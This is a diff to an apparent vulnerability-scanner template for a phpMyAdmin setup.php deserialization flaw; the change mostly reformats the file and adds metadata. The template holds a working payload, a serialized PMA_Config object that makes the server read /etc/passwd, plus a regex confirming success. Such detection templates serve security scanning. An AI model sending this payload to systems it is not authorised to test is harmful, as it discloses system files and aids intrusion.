@@ -1,16 +1,19 @@
 id: phpmyadmin-setup-deserialization
 
 info:
-    name: Phpmyadmin Setup Deserialization
-    author: p0wd3r
-    severity: high
+  name: Phpmyadmin Setup Deserialization
+  author: p0wd3r
+  severity: high
+  description: |-
+    Phpmyadmin Setup Deserialization Vulnerability
+  tags: phpmyadmin,deserialization
+  created: 2023/10/13
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /scripts/setup.php
-            body: action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: POST
+      path: /scripts/setup.php
+      body: action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
-
